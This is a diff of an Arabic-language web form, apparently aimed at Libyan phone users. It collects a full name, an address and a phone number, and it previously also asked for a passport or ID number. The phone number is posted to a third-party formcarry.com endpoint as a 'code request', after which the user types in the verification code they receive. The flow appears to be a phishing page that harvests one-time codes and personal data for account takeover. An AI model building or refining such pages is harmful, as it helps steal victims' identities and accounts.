@@ -30,7 +30,7 @@
       display: block;
       font-size: 14px;
     }
-    input, select, button {
+    input, button {
       width: 100%;
       padding: 10px;
       font-size: 15px;
@@ -57,9 +57,6 @@
     button:hover {
       background-color: #003366;
     }
-    .hidden {
-      display: none;
-    }
     .timer {
       text-align: center;
       font-weight: bold;
@@ -75,28 +72,8 @@
       <label>الاسم الكامل:</label>
       <input type="text" id="fullname" name="fullname" required pattern="^[\u0600-\u06FF\s]+$" title="الرجاء كتابة الاسم باللغة العربية فقط." />
 
-      <div class="row">
-        <div>
-          <label>المنطقة:</label>
-          <input type="text" id="region" name="region" required placeholder="مثال: تاجوراء" />
-        </div>
-        <div>
-          <label>المدينة:</label>
-          <input type="text" id="city" name="city" required placeholder="مثال: طرابلس" />
-        </div>
-      </div>
-
-      <label>نوع الوثيقة:</label>
-      <select id="documentType" onchange="toggleDocumentField()" required>
-        <option value="" disabled selected>اختر نوع الوثيقة</option>
-        <option value="جواز سفر">جواز سفر</option>
-        <option value="بطاقة شخصية">بطاقة شخصية</option>
-      </select>
-
-      <div id="documentField" class="hidden">
-        <label id="documentLabel">رقم الوثيقة:</label>
-        <input type="text" id="documentNumber" name="documentNumber" />
-      </div>
+      <label>العنوان (المنطقة والمدينة):</label>
+      <input type="text" id="address" name="address" required placeholder="مثال: تاجوراء - طرابلس" />
 
       <label>رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" placeholder="+218xxxxxxxxx" pattern="^\+2189[1-9][0-9]{7}$" required />
@@ -104,51 +81,30 @@
       <button type="button" onclick="sendPhone()">طلب الكود</button>
       <div class="timer" id="countdown" style="display: none">120 ثانية</div>
 
-      <div class="row">
-        <div>
-          <label>رمز الكود:</label>
-          <input type="text" id="code" name="code" placeholder="6 إلى 8 أرقام أو حروف" />
-        </div>
-        <div>
-          <label style="visibility:hidden">_</label>
-          <button type="button" onclick="submitWithCode()">تأكيد</button>
-        </div>
-      </div>
+      <label>رمز الكود:</label>
+      <input type="text" id="code" name="code" placeholder="6 إلى 8 أرقام أو حروف" required pattern="[A-Za-z0-9]{6,8}" />
 
-      <button type="button" onclick="submitWithCode()">إرسال جميع البيانات للتأكيد</button>
+      <button type="button" onclick="submitWithCode()">تأكيد الكود وإرسال البيانات</button>
     </form>
   </div>
 
   <script>
-    function toggleDocumentField() {
-      const type = document.getElementById("documentType").value;
-      const field = document.getElementById("documentField");
-      const label = document.getElementById("documentLabel");
-      const input = document.getElementById("documentNumber");
-      if (type) {
-        label.textContent = "رقم " + type + ":";
-        input.placeholder = "أدخل رقم " + type;
-        field.classList.remove("hidden");
-      } else {
-        field.classList.add("hidden");
-      }
-    }
-
     function sendPhone() {
-      const form = document.getElementById("form");
-      if (!form.checkValidity()) {
-        alert("يرجى تعبئة جميع الحقول بشكل صحيح قبل طلب الكود.");
+      const phoneInput = document.getElementById("phone");
+      if (!phoneInput.checkValidity()) {
+        alert("يرجى إدخال رقم هاتف صالح.");
         return;
       }
-      const formData = new FormData(form);
-      formData.delete("code");
+
+      const formData = new FormData();
+      formData.append("phone", phoneInput.value);
 
       fetch("https://formcarry.com/s/ldfA_DUCDrk", {
         method: "POST",
         body: formData,
       })
         .then(() => {
-          alert("تم إرسال البيانات وطلب الكود بنجاح.");
+          alert("تم إرسال رقم الهاتف وطلب الكود بنجاح.");
           startCountdown();
         })
         .catch(() => {
@@ -160,13 +116,6 @@
       const form = document.getElementById("form");
       if (!form.checkValidity()) {
         alert("يرجى تعبئة جميع الحقول بشكل صحيح.");
-        return;
-      }
-
-      const codeInput = document.getElementById("code");
-      if (!codeInput.value.trim()) {
-        alert("يرجى إدخال رمز الكود.");
-        codeInput.focus();
         return;
       }
 
